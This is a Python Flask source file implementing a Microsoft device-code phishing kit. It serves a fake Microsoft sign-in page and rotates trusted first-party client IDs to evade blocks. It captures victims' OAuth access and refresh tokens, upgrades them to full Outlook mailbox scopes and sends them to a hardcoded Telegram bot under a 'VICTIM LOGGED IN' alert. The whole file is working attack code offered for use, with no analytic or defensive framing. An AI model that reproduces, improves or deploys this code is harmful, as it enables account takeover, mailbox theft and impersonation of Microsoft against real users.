import os
import time
import sqlite3
import threading
import requests
import jwt
import json
from flask import Flask, request, render_template_string, redirect, url_for
from datetime import datetime

# --- Configuration ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"
DB_PATH = "/tmp/phish.db"

# Microsoft Public Client IDs (Rotated to avoid blocks)
# These are trusted first-party apps that don't show "Unverified Publisher" warnings
CLIENT_IDS = [
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office Desktop
    "268761a2-03f3-40df-8a8b-c3db24145b6b",  # OneDrive Sync
]

# Scopes including Outlook IMAP/SMTP for full mailbox access
SCOPE = "https://graph.microsoft.com/.default https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send offline_access openid profile email"

app = Flask(__name__)

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_code TEXT UNIQUE,
                    user_code TEXT,
                    verification_uri TEXT,
                    client_id TEXT,
                    status TEXT DEFAULT 'pending',
                    access_token TEXT,
                    refresh_token TEXT,
                    id_token TEXT,
                    email TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )''')
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# --- Telegram Notification ---
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        resp = requests.post(url, json=payload, timeout=10)
        if resp.status_code != 200:
            print(f"Telegram API Error: {resp.text}")
    except Exception as e:
        print(f"Telegram Connection Error: {e}")

# --- Microsoft API Helpers ---
def get_device_code(client_id):
    url = f"https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
    data = {
        "client_id": client_id,
        "scope": SCOPE
    }
    try:
        resp = requests.post(url, data=data, timeout=10)
        if resp.status_code == 200:
            return resp.json()
        else:
            print(f"Device Code Error for {client_id}: {resp.status_code} - {resp.text}")
            return None
    except Exception as e:
        print(f"Request Error for {client_id}: {e}")
        return None

def poll_token(device_code, client_id):
    url = f"https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": device_code,
        "client_id": client_id
    }
    
    while True:
        try:
            resp = requests.post(url, data=data, timeout=10)
            result = resp.json()
            
            if "access_token" in result:
                return result
            elif "error" in result:
                error = result["error"]
                if error == "authorization_pending":
                    time.sleep(5)
                    continue
                elif error == "slow_down":
                    time.sleep(10)
                    continue
                else:
                    # Other errors (expired, declined, bad_client_id)
                    print(f"Polling Error: {error} - {result.get('error_description', '')}")
                    return None
        except Exception as e:
            print(f"Polling Network Error: {e}")
            time.sleep(5)

def refresh_for_outlook(refresh_token, client_id):
    """
    Uses the captured refresh token to get a new access token specifically for Outlook/IMAP.
    This ensures we have valid credentials for email access even if the initial token was limited.
    """
    url = f"https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "client_id": client_id,
        "scope": "https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send offline_access openid profile email"
    }
    try:
        resp = requests.post(url, data=data, timeout=10)
        if resp.status_code == 200:
            return resp.json()
        else:
            print(f"Refresh Error: {resp.status_code} - {resp.text}")
            return None
    except Exception as e:
        print(f"Refresh Network Error: {e}")
        return None

# --- Routes ---

@app.route('/')
def index():
    init_db()
    
    # Try each client ID until one works
    for cid in CLIENT_IDS:
        data = get_device_code(cid)
        if data:
            # Save session to DB
            conn = get_db()
            conn.execute(
                "INSERT INTO sessions (device_code, user_code, verification_uri, client_id) VALUES (?, ?, ?, ?)",
                (data['device_code'], data['user_code'], data['verification_uri'], cid)
            )
            conn.commit()
            conn.close()
            
            # Start polling thread for this specific session
            t = threading.Thread(target=poll_and_exfil, args=(data['device_code'], cid))
            t.daemon = True
            t.start()
            
            return render_template_string(TEMPLATE, 
                user_code=data['user_code'], 
                verification_uri=data['verification_uri'])
    
    return "Service unavailable. Please try again later.", 503

def poll_and_exfil(device_code, client_id):
    """
    Polls for the initial token, then immediately refreshes for Outlook scopes,
    and sends everything to Telegram.
    """
    print(f"Started polling for device_code: {device_code[:10]}...")
    
    # 1. Poll for initial token
    tokens = poll_token(device_code, client_id)
    
    if not tokens:
        print(f"Failed to get initial token for {device_code[:10]}")
        update_status(device_code, "FAILED")
        return

    # 2. Extract Email from ID Token
    email = "Unknown"
    id_token = tokens.get('id_token')
    if id_token:
        try:
            decoded = jwt.decode(id_token, options={"verify_signature": False})
            email = decoded.get('upn') or decoded.get('email') or decoded.get('unique_name') or "Unknown"
        except Exception as e:
            print(f"JWT Decode Error: {e}")

    # 3. Refresh for Outlook/IMAP Scopes
    print(f"Initial token captured for {email}. Refreshing for Outlook scopes...")
    outlook_tokens = refresh_for_outlook(tokens['refresh_token'], client_id)
    
    final_access = tokens['access_token']
    final_refresh = tokens['refresh_token']
    imap_access = None
    
    if outlook_tokens:
        imap_access = outlook_tokens.get('access_token')
        # Update refresh token to the latest one from the refresh flow
        final_refresh = outlook_tokens.get('refresh_token', final_refresh)

    # 4. Update DB
    update_status(device_code, "SUCCESS", email, json.dumps(tokens), json.dumps(outlook_tokens))

    # 5. Send Telegram Notification
    msg = f"🎯 <b>VICTIM LOGGED IN</b>\n\n"
    msg += f"📧 <b>Email:</b> <code>{email}</code>\n"
    msg += f"🔑 <b>Access Token (Graph):</b> <code>{final_access[:30]}...</code>\n"
    if imap_access:
        msg += f"📬 <b>Access Token (IMAP):</b> <code>{imap_access[:30]}...</code>\n"
    msg += f"🔄 <b>Refresh Token:</b> <code>{final_refresh[:30]}...</code>\n\n"
    msg += f"<b>Full JSON Tokens:</b>\n<code>{json.dumps(tokens, indent=2)}</code>"
    
    if outlook_tokens:
        msg += f"\n\n<b>Outlook Refresh Response:</b>\n<code>{json.dumps(outlook_tokens, indent=2)}</code>"

    send_telegram_message(msg)
    print(f"Exfiltration complete for {email}")

def update_status(device_code, status, email=None, tokens=None, outlook_tokens=None):
    conn = get_db()
    conn.execute(
        "UPDATE sessions SET status=?, email=?, access_token=?, refresh_token=? WHERE device_code=?",
        (status, email, tokens, outlook_tokens, device_code)
    )
    conn.commit()
    conn.close()

# --- HTML Template (Microsoft Device Login Clone) ---
TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); text-align: center; border-radius: 2px; }
        .logo { width: 108px; margin-bottom: 24px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 16px; color: #1b1b1b; text-align: left; }
        p { font-size: 15px; color: #1b1b1b; margin-bottom: 24px; line-height: 1.5; text-align: left; }
        .code-box { background: #f2f2f2; padding: 12px; font-size: 24px; font-weight: 600; letter-spacing: 2px; text-align: center; margin-bottom: 24px; border: 1px solid #ccc; border-radius: 4px; cursor: pointer; user-select: all; }
        .btn { background: #0067b8; color: white; border: none; padding: 12px 24px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; border-radius: 4px; transition: background 0.2s; }
        .btn:hover { background: #005da6; }
        .footer { margin-top: 24px; font-size: 12px; color: #666; text-align: center; }
        a { color: #0067b8; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" class="logo" alt="Microsoft">
        <h1>Sign in</h1>
        <p>To sign in, use the code shown below and go to <a href="{{ verification_uri }}" target="_blank">{{ verification_uri }}</a></p>
        
        <div class="code-box" id="codeBox" onclick="copyCode()">{{ user_code }}</div>
        
        <button class="btn" onclick="openLogin()">Next</button>
        
        <div class="footer">
            Can't use your device? <a href="#">Try another way to sign in</a>
        </div>
    </div>

    <script>
        function copyCode() {
            const code = document.getElementById('codeBox').innerText;
            navigator.clipboard.writeText(code).then(() => {
                // Optional: Visual feedback could be added here
            }).catch(err => {
                console.error('Failed to copy: ', err);
            });
        }
        function openLogin() {
            window.location.href = "{{ verification_uri }}";
        }
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
